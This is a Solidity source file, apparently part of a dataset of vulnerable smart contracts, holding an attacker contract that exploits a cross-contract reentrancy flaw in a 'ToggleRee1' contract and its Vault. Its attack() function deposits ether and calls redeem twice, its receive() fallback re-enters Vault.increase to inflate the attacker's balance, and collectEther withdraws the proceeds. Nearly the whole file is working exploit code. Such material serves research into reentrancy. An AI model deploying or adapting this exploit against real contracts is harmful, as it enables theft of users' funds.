// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../dataset/cross-contract/access-control/feature-toggle/Toggle_ree1.sol";

// Contract C contains a cross-contract reentrancy vulnerability that can be exploited by an attacker.
// Specifically, the attacker can enter the Vault contract and invoke the `increase` function
// during the execution of the `redeem` function, which pays back funds. This allows the attacker
// to manipulate the contract's state and potentially drain funds.

contract ToggleRee1Attacker {
    Vault public immutable vault;
    ToggleRee1 public immutable c;
    bool flag = true;

    constructor(address _vault, address payable _c) {
        vault = Vault(_vault);
        c = ToggleRee1(_c);
    }

    function attack() public payable{
        (bool success,) = address(c).call{value: 1 ether}("");
        require(success);
        c.redeem(payable(address(this)));
        c.redeem(payable(address(this)));  // the second redeem() will pay 1000
    }

    receive() external payable {
        if (flag) {
            flag = false;
            vault.increase(address(this), 2 ether);
        }
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

}